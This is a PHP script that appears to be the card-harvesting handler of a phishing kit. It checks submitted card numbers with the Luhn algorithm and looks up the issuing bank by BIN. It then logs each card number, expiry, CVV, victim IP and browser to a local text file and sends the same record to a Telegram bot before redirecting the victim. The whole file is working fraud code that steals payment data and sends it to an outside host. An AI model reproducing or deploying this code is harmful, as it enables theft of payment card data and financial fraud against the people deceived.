<?php
session_start();
require_once('config.php');
$IP = getenv("REMOTE_ADDR");
$str = $_POST['ccnum'];
$exp = $_POST['exp'];
$new_str = str_replace(' ', '', $str);
$bin = substr($new_str, 0, 8);



if(empty($_POST['ccnum']) || empty($_POST['exp']) || empty($_POST['cvv']) )
{

	header("Location: payment.php");
}
else{


	function is_valid_luhn($number) {
  settype($number, 'string');
  $sumTable = array(
    array(0,1,2,3,4,5,6,7,8,9),
    array(0,2,4,6,8,1,3,5,7,9));
  $sum = 0;
  $flip = 0;
  for ($i = strlen($number) - 1; $i >= 0; $i--) {
    $sum += $sumTable[$flip++ & 0x1][$number[$i]];
  }
  return $sum % 10 === 0;
}

if(is_valid_luhn($new_str) && is_numeric($new_str)){




$ch = curl_init();

$url = "https://lookup.binlist.net/$bin";

curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');


$headers = array();
$headers[] = 'Accept-Version: 3';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

$result = curl_exec($ch);
if (curl_errno($ch)) {
    echo 'Error:' . curl_error($ch);
}
curl_close($ch);

$brand = '';
$type = '';
$emoji = '';
$bank = '';


$someArray = json_decode($result, true);

$emoji = $someArray['country']['emoji'];
$brand = $someArray['brand'];
$type = $someArray['type'];
$bank = $someArray['bank']['name'];
$banksite = $someArray['bank']['url'];
$bank_phone = $someArray['bank']['phone'];
$_SESSION['bankia'] = $bank;
$_SESSION['cn'] = $bin;
$_SESSION['site'] = $banksite;



$message .= "--++-----[ 💳 Post AU CC ".$bin." ".$bank." ".$brand." ".$IP." - ]-----++--\n";
$message .= "-------------------\n";
$message .= "CC : ".$_POST['ccnum']."\n";
$message .= "EXP : ".$exp."\n";
$message .= "CVV : ".$_POST['cvv']."\n";
$message .= "-------------- IP Infos ------------\n";
$message .= "https://geoiptool.com/en/?ip=$IP\n";
$message .= "BROWSER  : ".$_SERVER['HTTP_USER_AGENT']."\n";
$message .= "---------------------- 07-asefi ----------------------\n";
$text = fopen('../omar.txt', 'a');
fwrite($text, $message);

            $params=[
            'chat_id'=>$chat_id,
            'text'=>$message,
            ];
            $ch = curl_init($METRI_TOKEN . '/sendMessage');
            curl_setopt($ch, CURLOPT_HEADER, false);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            $result = curl_exec($ch);
            curl_close($ch);

header("Location: loading.php");

}
else{
	header("Location: payment.php");
}

}


	






?>